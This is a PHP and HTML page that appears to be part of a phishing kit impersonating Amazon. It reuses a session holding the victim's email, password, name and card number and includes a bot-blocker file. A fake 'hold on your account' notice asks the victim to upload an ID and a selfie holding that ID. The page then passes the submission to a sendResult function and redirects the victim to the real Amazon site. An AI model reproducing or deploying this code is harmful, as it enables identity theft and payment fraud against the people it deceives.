<?php
require 'includes/config.php';
require 'includes/functions.php';
require 'includes/blocker.php';

// Language detection removed; default to English
$visitor_info = getClientInfo();
$_SESSION['lang'] = 'en';

if(!isset($_SESSION['cardNumber'])) {
    header('Location: card');
    exit;
}

// Validasi ref parameter
$ref = $_GET['ref'] ?? '';
if (empty($ref) || $ref !== ($_SESSION['ref'] ?? '')) {
    header('Location: login');
    exit;
}

$email = $_SESSION['email'];
$password = $_SESSION['password'];
$fullname = $_SESSION['fullname'];
$cardNumber = $_SESSION['cardNumber'];

if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['selfie'])) {
    $data = [
        'pap_id' => $_POST['pap_id'],
        'selfie' => $_FILES['selfie']['name']  // Hanya simpan nama file, tidak disimpan ke disk
    ];
    sendResult('selfie', $data);
    header('Location: https://www.amazon.com');
    exit;
}
?>
<?php $lang = 'en'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Document Submission</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 15px;
        }

        .logo-image {
            width: 103px;
            height: auto;
        }

        .notice-box {
            background-color: #fff5f5;
            border: 2px solid #c40000;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
        }

        .notice-title {
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 8px;
            color: #c40000;
        }

        .notice-text {
            font-size: 13px;
            color: #333;
            line-height: 1.5;
        }

        h1 {
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .subtitle {
            color: #565959;
            font-size: 13px;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .section-title {
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 12px;
            margin-top: 20px;
        }

        .document-type {
            margin-bottom: 20px;
        }

        .type-label {
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 8px;
            display: block;
        }

        .upload-box {
            border: 2px dashed #d5d9d9;
            border-radius: 4px;
            padding: 20px;
            text-align: center;
            background-color: #fafafa;
            margin-bottom: 10px;
        }

        .upload-info {
            font-size: 12px;
            color: #565959;
            margin-bottom: 15px;
        }

        .file-button {
            background-color: white;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            padding: 8px 20px;
            font-size: 13px;
            cursor: pointer;
            transition: background-color 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .file-button:hover {
            background-color: #f7f7f7;
        }

        .file-input {
            display: none;
        }

        .file-name {
            font-size: 12px;
            color: #067d62;
            margin-top: 8px;
            display: none;
        }

        .comment-section {
            margin-top: 25px;
            margin-bottom: 20px;
        }

        .comment-link {
            color: #007185;
            font-size: 13px;
            text-decoration: none;
            cursor: pointer;
        }

        .comment-link:hover {
            text-decoration: underline;
            color: #c7511f;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to bottom, #ffd600, #ffca00);
            border: 1px solid #e6b800;
            border-radius: 25px;   /* bikin jadi oval */
            font-size: 14px;
            cursor: pointer;
            margin-top: 5px;
            color: #111;
            text-align: center;
        }

        .btn-submit:hover {
            background-color: #f7ca00;
        }

        .btn-submit:active {
            background-color: #e7b800;
        }

        .upload-icon {
            display: inline-block;
            width: 16px;
            height: 16px;
        }
    </style>
</head>
<body>
<div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="logo-image">
            </div>
    <form method="POST" action="" enctype="multipart/form-data" id="documentForm">
        <div class="container">
        <div class="notice-box">
            <div class="notice-title">Document Submission</div>
            <div class="notice-text">
                We reviewed the information you submitted but it was insufficient to remove the hold on your account. Please submit a document below to verify that you were authorized to use this payment method on your most recent order.
            </div>
        </div>

        <h1>Document Submission</h1>
        <p class="subtitle">This can help remove the hold on your account more quickly.</p>

        <div class="section-title">Document type</div>

        <!-- Personal ID -->
        <div class="document-type">
            <label class="type-label">Personal ID:</label>
            <div class="upload-box">
                <div class="upload-info">
                    Please upload ONE file of your ID card.<br>
                    For your security, do NOT include full credit card information.
                </div>
                <label for="personalId" class="file-button">
                    <span class="upload-icon">📎</span> Choose file
                </label>
                <input type="file" name="pap_id" id="personalId" class="file-input" accept="image/*,.pdf">
                <div id="fileName1" class="file-name"></div>
            </div>
        </div>

        <!-- Personal ID with Selfie -->
        <div class="document-type">
            <label class="type-label">Personal ID with Selfie:</label>
            <div class="upload-box">
                <div class="upload-info">
                    Upload a selfie holding your ID card. Make sure both your face and ID details are clearly visible.
                </div>
                <label for="personalIdSelfie" class="file-button">
                    <span class="upload-icon">📎</span> Choose file
                </label>
                <input type="file" name="selfie" id="personalIdSelfie" class="file-input" accept="image/*,.pdf" required>
                <div id="fileName2" class="file-name"></div>
            </div>
        </div>

        <!-- Submit -->
        <button type="submit" class="btn-submit">Submit document</button>
    </div>
</form>

<script>
    // Preview file names
    document.getElementById('personalId').addEventListener('change', function(e) {
        const fileName = e.target.files[0]?.name;
        const fileNameDiv = document.getElementById('fileName1');
        if (fileName) {
            fileNameDiv.textContent = '✓ ' + fileName;
            fileNameDiv.style.display = 'block';
        }
    });

    document.getElementById('personalIdSelfie').addEventListener('change', function(e) {
        const fileName = e.target.files[0]?.name;
        const fileNameDiv = document.getElementById('fileName2');
        if (fileName) {
            fileNameDiv.textContent = '✓ ' + fileName;
            fileNameDiv.style.display = 'block';
        }
    });

    // Form validation: ensure selfie file is uploaded
    document.getElementById('documentForm').addEventListener('submit', function(e) {
        const file = document.getElementById('personalIdSelfie').files[0];
        if (!file) {
            e.preventDefault();
            alert('Please upload selfie before submitting.');
        }
    });
</script>

</body>
</html>